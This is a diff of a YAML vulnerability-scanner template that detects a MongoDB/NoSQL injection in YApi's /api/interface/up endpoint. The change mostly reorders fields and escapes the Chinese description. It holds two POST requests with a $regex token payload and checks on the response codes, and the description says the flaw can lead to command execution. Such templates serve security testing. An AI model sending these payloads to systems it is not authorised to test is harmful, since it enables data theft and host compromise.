@@ -1,34 +1,36 @@
+expression: r0() && r1()
 id: yapi-sql-inject
-
 info:
-  name: YApi 接口管理平台 up SQL注入漏洞
   author: unknown
+  description: "YApi \u63A5\u53E3\u7BA1\u7406\u5E73\u53F0\u5B58\u5728SQL\u6CE8\u5165\
+    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7MongoDB\u6CE8\u5165\u83B7\u53D6\
+    \u5230\u7528\u6237\u6570\u636E\u540E\uFF0C\u901A\u8FC7\u5DF2\u77E5\u7684AES\u5BC6\
+    \u94A5\u751F\u6210\u52A0\u5BC6\u540E\u7684Token\u53EF\u4EE5\u901A\u8FC7VM\u9003\
+    \u9038\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u83B7\u53D6\u4E3B\u673A\u6743\u9650\
+    \napp=\"YApi\"\n"
+  name: "YApi \u63A5\u53E3\u7BA1\u7406\u5E73\u53F0 up SQL\u6CE8\u5165\u6F0F\u6D1E"
+  reference:
+  - http://wiki.peiqi.tech/wiki/webapp/YApi/YApi%20%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20up%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
   severity: high
   verified: true
-  description: |
-    YApi 接口管理平台存在SQL注入漏洞，攻击者通过MongoDB注入获取到用户数据后，通过已知的AES密钥生成加密后的Token可以通过VM逃逸执行系统命令获取主机权限
-    app="YApi"
-  reference:
-    - http://wiki.peiqi.tech/wiki/webapp/YApi/YApi%20%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20up%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
-
 rules:
   r0:
-    request:
-      method: POST
-      path: /api/interface/up
-      headers:
-        Content-Type: application/json
-      body: |
-        {"id": -1, "token": {"$regex": "^1cae15606ea4b223b01a"}}
     expression: response.status == 200 && response.body.bcontains(b'"errcode":') &&  response.body.bcontains(b'400,')
-  r1:
     request:
-      method: POST
-      path: /api/interface/up
+      body: '{"id": -1, "token": {"$regex": "^1cae15606ea4b223b01a"}}
+
+        '
       headers:
         Content-Type: application/json
-      body: |
-        {"id": -1, "token": {"$regex": "^1cae15606ea4b223b01b"}}
+      method: POST
+      path: /api/interface/up
+  r1:
     expression: response.status == 200 && response.body.bcontains(b'"errcode":') &&  response.body.bcontains(b'40011,')
-expression: r0() && r1()
-    
+    request:
+      body: '{"id": -1, "token": {"$regex": "^1cae15606ea4b223b01b"}}
+
+        '
+      headers:
+        Content-Type: application/json
+      method: POST
+      path: /api/interface/up
